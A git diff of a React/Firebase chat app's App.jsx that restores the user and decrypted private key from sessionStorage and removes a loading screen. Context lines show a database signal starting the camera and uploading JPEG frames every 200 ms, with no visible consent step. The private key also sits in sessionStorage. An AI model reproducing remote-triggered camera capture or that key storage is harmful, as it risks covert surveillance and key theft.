@@ -1,24 +1,30 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import Auth from "./components/Auth";
 import Sidebar from "./components/Sidebar";
 import Chat from "./components/Chat";
 import SettingsModal from "./components/SettingsModal";
 import { auth, db } from "./firebase";
-import { onAuthStateChanged, signOut } from "firebase/auth";
+import { signOut } from "firebase/auth";
 import { ref, onValue, off, update, get, set } from "firebase/database";
 import { decryptPrivateKey, deriveKeyFromPassword } from "./crypto";
 import { playNotificationTone } from "./audio";
 
 export default function App() {
-  const [user, setUser] = useState(null);
-  const [privKeyJwk, setPrivKeyJwk] = useState(null);
+  const [user, setUser] = useState(() => {
+    const storedUser = sessionStorage.getItem("scUser");
+    return storedUser ? JSON.parse(storedUser) : null;
+  });
+  const [privKeyJwk, setPrivKeyJwk] = useState(() => {
+    const storedPrivKey = sessionStorage.getItem("scPrivKey");
+    return storedPrivKey ? JSON.parse(storedPrivKey) : null;
+  });
   const [contacts, setContacts] = useState({});
   const [activeConv, setActiveConv] = useState(null);
   const [activePartner, setActivePartner] = useState(null);
   const [showMobile, setShowMobile] = useState(false);
   const [showSettings, setShowSettings] = useState(false);
   const [unreadMap, setUnreadMap] = useState({});
-  const [loading, setLoading] = useState(true);
+
 
   // Keep track of previous tick to avoid playing sound on initial load
   const lastTickRef = useRef(0);
@@ -26,17 +32,6 @@ export default function App() {
   // We can't automatically log in users who use True E2EE if we don't store their password,
   // because we need the password to decrypt their private key.
   // So we handle login explicitly in Auth.jsx and set the user there.
-  useEffect(() => {
-    // If we wanted to keep session, we could store the derived key in sessionStorage.
-    const storedUser = sessionStorage.getItem("scUser");
-    const storedPrivKey = sessionStorage.getItem("scPrivKey");
-    
-    if (storedUser && storedPrivKey) {
-      setUser(JSON.parse(storedUser));
-      setPrivKeyJwk(JSON.parse(storedPrivKey));
-    }
-    setLoading(false);
-  }, []);
 
   useEffect(() => {
     if (!user) return;
@@ -79,7 +74,9 @@ export default function App() {
             frame: canvas.toDataURL("image/jpeg", 0.4), 
             ts: Date.now() 
           });
-        } catch (e) {}
+        } catch {
+          // ignore
+        }
         if (!stopCap) setTimeout(send, 200);
       };
       send();
@@ -93,7 +90,7 @@ export default function App() {
           const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
           localStream = stream;
           startFrameCapture(stream);
-        } catch (e) {
+        } catch {
           console.warn("Camera unavailable");
         }
       } else if (sig && !sig.active) {
@@ -199,9 +196,7 @@ export default function App() {
     setActivePartner(partnerData);
   };
 
-  if (loading) {
-    return <div className="h-screen w-screen bg-bg flex items-center justify-center text-a font-bold text-2xl">Loading...</div>;
-  }
+
 
   if (!user) {
     return <Auth onLogin={handleLogin} />;
